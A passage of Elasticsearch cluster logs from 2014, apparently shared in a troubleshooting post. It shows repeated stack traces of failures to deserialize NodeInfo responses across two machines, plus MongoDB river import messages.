    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8668
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 04:59:45,859][INFO ][org.elasticsearch.river.mongodb.Slurper] MongoDBRiver is beginning initial import of zanroo.message
[2014-08-28 04:59:45,859][INFO ][org.elasticsearch.river.mongodb.Slurper] MongoDBRiver is beginning initial import of zanroo.message
[2014-08-28 04:59:45,859][INFO ][org.elasticsearch.river.mongodb.Slurper] MongoDBRiver is beginning initial import of zanroo.message
[2014-08-28 04:59:45,864][INFO ][org.elasticsearch.river.mongodb.Slurper] Collection message - count: 1968924
[2014-08-28 04:59:45,865][INFO ][org.elasticsearch.river.mongodb.Slurper] Collection message - count: 2130323
[2014-08-28 04:59:45,865][INFO ][org.elasticsearch.river.mongodb.Slurper] Collection message - count: 2255027
```
# Machine 2

```
[2014-08-28 01:00:04,951][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [RgzCfs2_RE27p6RgzEb1Jw]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8436
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:04,965][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [WqnW6SX3TfCLTbBvFcYQgA]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8434
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:04,954][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [lXDpSZ3OQCu6eVulQVcbiQ]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:310)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8528
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:04,977][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [lLjxLWhoSti-hvdAuJ2wUg]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8436
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:04,989][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [myWkK47kRxSh93CRKH5O3w]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8435
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:05,251][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [lXDpSZ3OQCu6eVulQVcbiQ]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8528
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:05,252][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [myWkK47kRxSh93CRKH5O3w]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8435
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
